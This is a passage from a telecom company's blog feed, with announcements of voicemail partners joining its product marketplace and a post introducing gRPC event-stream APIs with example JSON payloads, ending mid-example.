among other things, unique security or SMS enhancing features to their subscriptions in the below mockup that starts like this.</p><img loading="lazy" width="40%" align="right" style="display:block;margin:auto 10px" src="/jp/141274ac36715383b27eb5dc4535a418.png" class="img_ev3q"><p>Robert’s final positive assessment of this design work was summed up with the word “bullseye” in terms of our understanding of the personas’ flows and in surfacing Nortel’s desire to differentiate themselves.</p><p>We also learned about which products on our roadmap Nortel believed will resonate best with their business objectives and with their customers. We did this through some card sorting exercises, where we asked Nortel which product opportunities they considered ‘need to have’, ‘nice to have’, and ‘not relevant’ as illustrated here:</p><img loading="lazy" width="40%" align="right" style="display:block;margin:auto 10px" src="/jp/4e0bec81695c4936acd529e252483479.png" class="img_ev3q"><p>Their feedback will clearly help us determine which products we will make available on our platform for not only Nortel but other operators as well going forward.</p><p>After a well-deserved social visit planned together for early June, during the next few months, we plan on working directly with some of Nortel’s customers in the following areas:</p><ul><li>running participatory design sessions on the subscriber experience</li><li>discussing our product roadmap</li><li>forming a charter customer program with subscribers to gather continuous and ongoing feedback</li></ul><p>We would never have gotten as far as we’ve gotten in understanding Nortel and their customers’ problem space without being able to do this type of user research. So this will be our recipe going forward with those operators, who also hear beautiful music when learning about Working Group Two’s product ecosystem.</p><p>To learn more, visit <a href="https://www.wgtwo.com/product-ecosystem/" target="_blank" rel="noopener noreferrer">our products ecosystem page</a> or get in touch with us at <a href="mailto:products@wgtwo.com" target="_blank" rel="noopener noreferrer">products@wgtwo.com</a>.</p>]]></content:encoded>
            <category>marketplace</category>
            <category>partners</category>
            <category>ecosystem</category>
        </item>
        <item>
            <title><![CDATA[Vxt is on a mission to eradicate boring tasks. Now they’re joining Working Group Two’s product marketplace.]]></title>
            <link>https://www.wgtwo.com/jp/blog/vxt-joins-marketplace</link>
            <guid>vxt-joins-marketplace</guid>
            <pubDate>Mon, 21 Mar 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[Vxt, a technology communications company in New Zealand, will be adding their voicemail product to Working Group Two’s marketplace. Their aim is to increase visibility and distribution with mobile operators on Working Group Two’s platform.]]></description>
            <content:encoded><![CDATA[<p><strong>Vxt</strong>, a technology communications company in New Zealand, will be adding their voicemail product to Working Group Two’s marketplace. Their aim is to increase visibility and distribution with mobile operators on Working Group Two’s platform.</p><p>The passionate <a href="https://www.vxt.co.nz/" target="_blank" rel="noopener noreferrer">Vxt</a> team is on a mission to leverage communications data to automate the most boring work in the world, namely administrative tasks. They’ve made voicemail both simpler and smarter by offering instant transcriptions, smart greetings, email integration, and the ability to access your messages from anywhere.</p><img loading="lazy" width="40%" align="right" style="display:block;margin:auto 10px" src="/jp/c2548362071271d7bd6a0c7f4fe40588.png" class="img_ev3q"><p>But wait, isn’t voicemail a thing of the past?</p><p><em>"We see the importance of voicemail increasing or declining based on specific demographics,”</em> says Luke Campbell, the CEO of Vxt.</p><p>Vxt describes people who are highly dependent on their phones for their work as being particularly passionate about voicemail. Lawyers, real estate agents, plumbers - they might get dozens of calls every day. So where others turn off voicemail, these people might want to get their voicemails forwarded to their emails, be able to share their inbox with a colleague or assistant, have voicemails automatically translated to text, and integrate their messages with productivity tools like Asana or an ERP system. Some may also need to have their messages stored for regulatory or security purposes. A real estate agent with (say) 10,000 contacts, may want to customize the greetings so that every time one of the 200 Johns or Jessicas call, they get a personal message stating their name.</p><img loading="lazy" width="40%" align="right" style="display:block;margin:auto 10px" src="/jp/d3c389fcf29a5906768f4bb92dd56a28.png" class="img_ev3q"><p>Soon, Vxt Voicemail will be added to Working Group Two’s marketplace and made available to operators on the platform. The operators will then be able to offer Vxt to their customers.</p><p><em>“It’s exciting to work with companies like Vxt. They have set out to solve real pain points by automating routine tasks such as calling, voicemail, and note-taking. We have a shared view on the importance of building scalable ecosystems and programmable networks that leverage built-in core functionality in a new way,”</em> says Marius Waldum, the Head of Product at Working Group Two.</p><p>The Working Group Two marketplace is an integrated part of the company’s ambition to deliver value for operators, product developers, and mobile customers alike. Working Group Two’s cloud-native mobile network brings radical simplification, cost efficiency and a platform to leverage a developer community - to drive innovation and capitalize on disruptive technologies.</p><p>To learn more, visit <a href="https://www.wgtwo.com/product-ecosystem/" target="_blank" rel="noopener noreferrer">our products ecosystem page</a> or get in touch with us at <a href="mailto:products@wgtwo.com" target="_blank" rel="noopener noreferrer">products@wgtwo.com</a>.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="about-vxt">About Vxt<a class="hash-link" href="#about-vxt" title="Direct link to heading">​</a></h2><img loading="lazy" width="35%" align="right" style="display:block;margin:auto 10px" src="/jp/2750b967d0c7f1bf16af58e98d19d248.jpg" class="img_ev3q"><p>Vxt leverages communications data to automate the worlds admin. Vxt provides a platform with powerful communications tools that connect to a businesses key management software. People use Vxt for phone calls, video meetings, note taking, voicemail and more to automate hours of administrative every day. <a href="https://www.vxt.co.nz/" target="_blank" rel="noopener noreferrer">https://www.vxt.co.nz/</a></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="about-working-group-two">About Working Group Two​<a class="hash-link" href="#about-working-group-two" title="Direct link to heading">​</a></h2><p>Working Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency - leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Their mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services. Read more at <a href="https://wgtwo.com" target="_blank" rel="noopener noreferrer">https://wgtwo.com</a>.</p>]]></content:encoded>
            <category>marketplace</category>
            <category>voicemail</category>
            <category>partners</category>
        </item>
        <item>
            <title><![CDATA[Voxist to join the Working Group Two marketplace]]></title>
            <link>https://www.wgtwo.com/jp/blog/voxist-to-join-marketplace</link>
            <guid>voxist-to-join-marketplace</guid>
            <pubDate>Mon, 14 Mar 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[Voxist - a smart and personalized voicemail product for mobile - will be joining Working Group Two’s marketplace. This means that mobile operators on the Working Group Two platform will soon be able to make Voxist available to their subscribers.]]></description>
            <content:encoded><![CDATA[<p><strong>Voxist</strong> - a smart and personalized voicemail product for mobile - will be joining Working Group Two’s marketplace. This means that mobile operators on the Working Group Two platform will soon be able to make Voxist available to their subscribers.</p><p>The idea of the team behind <a href="https://www.voxist.com" target="_blank" rel="noopener noreferrer">Voxist</a> is to create a virtual personal assistant that replaces old voicemail systems. People calling get personalized greetings, and a message can be transcribed and sent as a text message. A Voxist user can access voicemail messages through the web or app interface - or via email when away from the phone.</p><p>The company, based in France, sees voicemail transforming into a productivity tool for businesses.</p><p><em>“I see voicemail becoming more like a personal assistant. A restaurant, for example, can let patrons reserve tables directly into the booking system just using their voices. A law firm or a bank can integrate voicemail with their CRM systems. A big movement now is to move voice messaging into core automation”</em> says Karel Bourgois, the CEO of Voxist.</p><img loading="lazy" width="50%" align="right" style="display:block;margin:40px auto" src="/jp/4b879da65e27c8b028933f586c238db4.png" class="img_ev3q"><p>The Working Group Two marketplace is an integrated part of the company’s ambition to deliver value for operators, product developers, and mobile customers alike. Working Group Two’s cloud-native mobile network brings radical simplification, cost efficiency and a platform to leverage a developer community - to drive innovation and capitalize on disruptive technologies.</p><p><em>“By building product distribution mechanisms outside the typical mobile app stores we allow for new ways of thinking about value propositions, features, bundling and pricing. An operator can offer developers a more granular distribution agreement, based on marketing efforts and expected volumes. A Voxist user benefits from tight integration with functionality in the mobile core network,”</em> says Karel Bourgois.</p><p>Working Group Two is building an ecosystem for a new category of products and services that can thrive in the interface between the communication and the connectivity layers. This means that products on the platform can take advantage of functionality deeper in the technology stack via APIs - such as event and media streams that are only available through a mobile core network.</p><p><em>“We’re excited to be working with the Voxist team to drive distribution of their voicemail product. The operators can address new segments and uncover new revenue streams. Ultimately, mobile customers get access to new and exciting products that take advantage of capabilities in the mobile network they may never have seen before,”</em> says Marius Waldum, Head of Product at Working Group Two.</p><p>The Voxist personalized voicemail product will become available to operators in the near future.</p><p>To learn more, visit <a href="https://www.wgtwo.com/product-ecosystem/" target="_blank" rel="noopener noreferrer">https://www.wgtwo.com/product-ecosystem/</a> or get in touch with us at <a href="mailto:products@wgtwo.com" target="_blank" rel="noopener noreferrer">products@wgtwo.com</a>.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="about-voxist">About Voxist<a class="hash-link" href="#about-voxist" title="Direct link to heading">​</a></h2><p>The Voxist team are AI and Telcom experts that are building cutting edge voice technology. Voxist mobile apps power tens of thousands of mobile users' voicemails in France and in the US and its voice recognition technology is designed to enable even more use cases in the near future. Their mission is to create vocal assistants for everyone, from SMBs to large corporations. Find out more at <a href="https://www.voxist.com" target="_blank" rel="noopener noreferrer">https://www.voxist.com</a>.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="about-working-group-two">About Working Group Two<a class="hash-link" href="#about-working-group-two" title="Direct link to heading">​</a></h2><p>Working Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency - leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Their mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services. Read more at <a href="https://wgtwo.com" target="_blank" rel="noopener noreferrer">https://wgtwo.com</a>.</p>]]></content:encoded>
            <category>marketplace</category>
            <category>voicemail</category>
            <category>partners</category>
        </item>
        <item>
            <title><![CDATA[We are releasing our first production-ready gRPC APIs!]]></title>
            <link>https://www.wgtwo.com/jp/blog/releasing-our-first-grpc-apis</link>
            <guid>releasing-our-first-grpc-apis</guid>
            <pubDate>Tue, 01 Mar 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[At wgtwo we have been offering public APIs for a long time using major version zero.]]></description>
            <content:encoded><![CDATA[<p>At <strong>wgtwo</strong> we have been offering public APIs for a long time using major version zero.</p><p>They have been great for playing around with and we have learned a lot about what we actually need. So now its time to step up our game.</p><p>We are releasing our first production ready gRPC APIs!</p><p>Have you ever received a welcome SMS when toggling flight mode off as you were on your way out of a plane starting off your awesome vacation? In this blog post we will describe our approach to supporting that vacation-feeling SMS, and how we transitioned to using gRPC streams to support it and greatly improve the flexibility of our platform.</p><p><img loading="lazy" src="/jp/assets/images/welcome-ddefd40287659347c8f60af234a341a5.png" width="930" height="864" class="img_ev3q"></p><p>As a quick first version, we have implemented a service that listens to location update events happening in our core and decides whether a user has changed country or not according to our records of your previous and new location. If a user did change country, we would fire a simple POST request to a configured endpoint hosted by the operator with this information. This has for most parts been good enough to get the job done, but it creates an explicit dependency between our core and our partner operator service being up and responsive, which makes the solution prone to errors and makes the system less flexible.</p><p>At <strong>wgtwo</strong>, we are relying heavily on gRPC APIs, and we are now ready to officially release our first gRPC API after playing around with our v0 APIs for a long time.</p><p>To get notifications of a phone attaching to a network in another country, you may use our <code>StreamCountryChangeEvents</code> API.</p><p>By calling this API, you initiate a server stream where you will receive this type of event for your customers. The API requires that you send an acknowledgement message when you have successfully processed the event; failing to do so will make it resend after a given timeout.</p><p>You may control load for your clients by setting how many concurrent events should be in-flight, and you may create multiple connections to share load between your servers.  This gives both us and the users of our API greater flexibility in consuming events that happen in the core of our network, and it gives the caller of the API the freedom to react in a way they believe is best for their user base. This is true for all the event-type server streams we offer.</p><p>All in all, we feel that moving to gRPC, where we give the client flexibility in how these events should be consumed and protect the client from high load, is the right move. This is instead of spending energy on adding resending and failure handling to our previous solution.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="the-apis">The APIs<a class="hash-link" href="#the-apis" title="Direct link to heading">​</a></h3><p>Our first batch of gRPC APIs is listed below.</p><p>All our event-based APIs have a common metadata field, which contains the subscriber identifier (using Pairwise Pseudonymous Identifier) and the identifier used for acknowledging the messages. For brevity this is not included in the examples below.</p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="streamcountrychangeevents">StreamCountryChangeEvents<a class="hash-link" href="#streamcountrychangeevents" title="Direct link to heading">​</a></h4><p>This one is explained in the intro section and will let you listen to a stream of events for when the SIM first attaches to a network in another country.</p><h5 class="anchor anchorWithStickyNavbar_LWe7" id="example">Example<a class="hash-link" href="#example" title="Direct link to heading">​</a></h5><div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token property">"metadata"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"> ... </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token property">"countryChangeEvent"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">"previous"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      </span><span class="token property">"code"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"NO"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      </span><span class="token property">"name"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"Norway"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">"current"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      </span><span class="token property">"code"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"SE"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      </span><span class="token property">"name"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"Sweden"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Read the docs: <a href="https://v1.docs.wgtwo.com/guide/subscription/v1/how-to-get-country-change-events.html" target="_blank" rel="noopener noreferrer">Get country change events</a></p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="streamhandsetchangeevents">StreamHandsetChangeEvents<a class="hash-link" href="#streamhandsetchangeevents" title="Direct link to heading">​</a></h4><p>This lets you listen to a stream of events for when a SIM attaches via a new handset. This is typically used for sending you new APN settings as you set up your new phone.</p><h5 class="anchor anchorWithStickyNavbar_LWe7" id="example-1">Example<a class="hash-link" href="#example-1" title="Direct link to heading">​</a></h5><div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token property">"metadata"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"> ... </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token property">"handsetChangeEvent"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">"previous"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      </span><span class="token property">"imeiSv"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        </span><span class="token property">"imei"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"86700000000000"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        </span><span class="token property">"softwareVersion"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"64"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">"current"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      </span><span class="token property">"imeiSv"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        </span><span class="token property">"imei"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"86700000000001"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        </span><span class="token property">"softwareVersion"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"65"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">"imsi"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      </span><span class="token property">"value"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"(...)"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Read the docs: <a href="https://v1.docs.wgtwo.com/guide/subscription/v1/how-to-get-handset-change-events.html" target="_blank" rel="noopener noreferrer">Get handset change events</a></p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="streamfirstattachmentevents">StreamFirstAttachmentEvents<a class="hash-link" href="#streamfirstattachmentevents" title="Direct link to heading">​</a></h4><p>This lets you listen to a stream of events for when the SIM attaches to the network for the first time. In other words, it gives an operator a simple way to see that a SIM has been taken in use.</p><h5 class="anchor anchorWithStickyNavbar_LWe7" id="example-2">Example<a class="hash-link" href="#example-2" title="Direct link to heading">​</a></h5><div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token property">"metadata"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"> ... </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token property">"firstAttachmentEvent"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">"number"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      </span><span class="token property">"e164"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"+47xxxxxxxx"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">"imsi"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      </span><span class="token property">"value"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"24206000010001"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Read the docs: <a href="https://v1.docs.wgtwo.com/guide/subscription/v1/how-to-get-first-attachment-events.html" target="_blank" rel="noopener noreferrer">Get first attachment events
</a></p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="streamperiodiccountryevents">StreamPeriodicCountryEvents<a class="hash-link" href="#streamperiodiccountryevents" title="Direct link to heading">​</a></h4><p>This API has some similarities to the StreamCountryChangeEvents API. It will periodically send events related to the country a SIM card is located in.</p><p>This may be used if you want a message to be sent out when a user has a longer stay in another country, and you want to ensure the user has the required information about roaming prices.</p><h5 class="anchor anchorWithStickyNavbar_LWe7" id="example-3">Example<a class="hash-link" href="#example-3" title="Direct link to heading">​</a></h5><div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token property">"metadata"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"> ... </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token property">"periodicCountryEvent"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">"number"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      </span><span class="token property">"e164"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"+4799990000"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">"imsi"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      </span><span class="token property">"value"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"242010000000000"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">"country"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      </span><span class="token property">"code"</span><span class="token 